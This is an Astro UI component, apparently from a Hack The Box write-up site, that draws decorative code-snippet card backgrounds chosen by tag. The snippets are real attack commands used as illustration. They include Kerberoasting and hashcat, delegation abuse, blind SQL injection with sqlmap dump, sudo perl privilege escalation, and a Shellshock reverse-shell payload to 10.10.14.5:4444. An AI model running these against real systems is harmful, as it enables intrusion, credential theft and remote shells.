---
// Code-motif card visual, following the `.card-visual-code` pattern in Page_8.
// The variant is picked from the writeup's real tags and the hostname comes
// from its slug, so every card is specific to its box without needing artwork.
interface Props {
  slug: string;
  tags: string[];
  class?: string;
}

const { slug, tags, class: className = '' } = Astro.props;

const host = `${slug.replace(/^htb-/, '')}.htb`;
const low = tags.map((t) => t.toLowerCase());
const has = (...names: string[]) => names.some((n) => low.includes(n));

// First match wins, ordered most specific first.
type Variant =
  | 'kerberos' | 'delegation' | 'ad-enum' | 'sqli'
  | 'shellshock' | 'mcp' | 'web-rce' | 'privesc' | 'network' | 'recon';

const variant: Variant =
  // Delegation is checked first: a box tagged both rbcd and kerberos is really
  // a delegation chain, and that is the more specific story to tell.
  has('rbcd', 'constrained-delegation', 'ntlm-relay', 'pre2k', 'gmsa', 'spn-jacking') ? 'delegation'
  : has('kerberos', 'golden-ticket', 'rubeus', 'kerberoasting') ? 'kerberos'
  : has('active-directory', 'ldap', 'smb', 'password-spray', 'pass-the-hash') ? 'ad-enum'
  : has('shellshock', 'cgi') ? 'shellshock'
  : has('mcp') ? 'mcp'
  : has('sqli', 'sql-injection') ? 'sqli'
  : has('rce', 'command-injection') ? 'web-rce'
  : has('ike', 'vpn', 'ssh-tunneling', 'psk-crack') ? 'network'
  : has('privesc', 'sudo', 'suid', 'gtfobins', 'docker', 'sebackupprivilege', 'server-operators') ? 'privesc'
  : has('web', 'subdomain-enumeration', 'php') ? 'web-rce'
  : 'recon';

const k = (s: string) => `<span class="kw">${s}</span>`;
const v = (s: string) => `<span class="var">${s}</span>`;
const c = (s: string) => `<span class="comment">${s}</span>`;
const str = (s: string) => `<span class="str">${s}</span>`;
const num = (s: string) => `<span class="num">${s}</span>`;

const motifs: Record<Exclude<Variant, 'network'>, string> = {
  kerberos: `${k('$')} GetUserSPNs.py -request ${host}/svc
${v('ServicePrincipalName')}              ${v('Name')}
--------------------------------- -------
MSSQLSvc/dc01.${host}:${num('1433')}   sql_svc
HTTP/web01.${host}                iis_svc

${c('[*] Extracting TGS tickets...')}
${k('$krb5tgs$')}${num('23')}$*sql_svc$${host.toUpperCase()}...
${c('[*] Saving hashes to tgs.txt')}

${k('$')} hashcat -m ${num('13100')} tgs.txt rockyou.txt`,

  delegation: `${c('# Writing msDS-AllowedToActOnBehalfOfOtherIdentity')}
${k('$')} rbcd.py -delegate-to ${str("'WEB01$'")} \\
    -delegate-from ${str("'MS01$'")} -action write
${c('[*] Delegation rights modified successfully')}

${k('$')} getST.py -spn ${str(`'http/web01.${host}'`)} \\
    -impersonate ${v('Administrator')}
${c('[*] Saving ticket in Administrator.ccache')}
${k('$')} export KRB5CCNAME=Administrator.ccache`,

  'ad-enum': `${k('$')} netexec smb ${host} -u ${str("''")} -p ${str("''")} --shares
${v('SMB')}  ${num('445')}  DC01  [*] ${host} (signing:True)
${v('SMB')}  ${num('445')}  DC01  [+] Guest account enabled

${v('Share')}          ${v('Permissions')}   ${v('Remark')}
-------------- ------------- ---------------
HR             READ
SYSVOL         READ          Logon server

${c('# Enumerating ACLs via BloodHound...')}`,

  sqli: `${c('# Blind boolean-based injection')}
${k('GET')} /index.php?id=${num('1')}${str("' AND 1=1-- -")} ${v('HTTP/1.1')}
${v('Host')}: ${host}
${c('# Response: 200 OK   (rows returned)')}

${k('GET')} /index.php?id=${num('1')}${str("' AND 1=2-- -")} ${v('HTTP/1.1')}
${c('# Response: 200 OK   (empty, condition false)')}

${k('$')} sqlmap -u ${str(`'http://${host}/index.php?id=1'`)} \\
    --dump --batch`,

  shellshock: `${c('# Bash function-definition parsing bug')}
${k('GET')} /cgi-bin/user.sh ${v('HTTP/1.1')}
${v('Host')}: ${host}
${v('User-Agent')}: ${str('() { :; }; echo; /bin/bash -c')} \\
  ${str('"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')}

${c('# Response: 200 OK')}
${k('$')} nc -lvnp ${num('4444')}
connect to [10.10.14.5] from ${host}
${v('shelly@')}${host.split('.')[0]}:~$`,

  mcp: `${k('POST')} /api/mcp/connect ${v('HTTP/1.1')}
${v('Host')}: inspector.${host}
${v('Content-Type')}: application/json

{
  ${str('"transport"')}: ${str('"stdio"')},
  ${str('"command"')}: ${str('"bash"')},
  ${str('"args"')}: [${str('"-c"')}, ${str('"id"')}]
}

${c('# 200 OK: no authentication required')}
uid=${num('1000')}(${v('app')}) groups=${num('999')}(${v('docker')})`,

  'web-rce': `${k('POST')} /api/exec ${v('HTTP/1.1')}
${v('Host')}: ${host}
${v('Content-Type')}: application/json

{
  ${str('"cmd"')}: ${str('"id"')},
  ${str('"args"')}: [${str('"-a"')}]
}

${c('# Response: 200 OK')}
uid=${num('0')}(${v('root')}) gid=${num('0')}(${v('root')}) groups=${num('0')}(${v('root')})`,

  privesc: `${k('$')} sudo -l
User ${v('www-data')} may run the following commands:
    (${v('ALL')}) ${k('NOPASSWD')}: /usr/bin/perl

${c('# GTFOBins one-liner')}
${k('$')} sudo perl -e ${str("'exec \"/bin/sh\";'")}
${c('# uid=0(root) gid=0(root)')}

${k('$')} cat /root/root.txt
${str('a3f9c1...')}`,

  recon: `${k('$')} nmap -sC -sV -p- ${host}
${v('PORT')}     ${v('STATE')} ${v('SERVICE')}   ${v('VERSION')}
${num('22')}/tcp   open  ssh       OpenSSH 8.9p1
${num('80')}/tcp   open  http      nginx 1.18.0
${num('445')}/tcp  open  microsoft-ds

${c('[*] Fingerprinting services...')}
${c('[+] Host appears to be a domain member')}`,
};
---

{variant === 'network' ? (
  <div class:list={['shrink-0 overflow-hidden relative opacity-60 group-hover:opacity-100 transition-opacity duration-300', className]}>
    <div
      class="relative w-full h-full opacity-60 mix-blend-screen"
      style="background-image: radial-gradient(circle at 20% 30%, #4ade80 1px, transparent 1px), radial-gradient(circle at 80% 40%, #4ade80 1px, transparent 1px), radial-gradient(circle at 40% 70%, #4ade80 1px, transparent 1px), radial-gradient(circle at 60% 20%, #4ade80 1px, transparent 1px); background-size: 100% 100%;"
    >
      <svg class="absolute inset-0 w-full h-full stroke-accent/30" stroke-width="0.5" fill="none" aria-hidden="true">
        <line x1="20%" y1="30%" x2="80%" y2="40%"/>
        <line x1="80%" y1="40%" x2="60%" y2="20%"/>
        <line x1="20%" y1="30%" x2="40%" y2="70%"/>
        <line x1="40%" y1="70%" x2="80%" y2="40%"/>
      </svg>
    </div>
    <div class="absolute inset-0 bg-gradient-to-t from-surface via-transparent to-transparent pointer-events-none"></div>
  </div>
) : (
  <div class:list={['shrink-0 flex items-start justify-start overflow-hidden relative opacity-60 group-hover:opacity-100 transition-opacity duration-300', className]} aria-hidden="true">
    <pre class="text-[8px] font-mono leading-[1.5] card-visual-code text-muted/70 w-full"><code class="block" set:html={motifs[variant]} /></pre>
    <div class="absolute inset-0 bg-gradient-to-t from-surface via-transparent to-transparent pointer-events-none"></div>
  </div>
)}
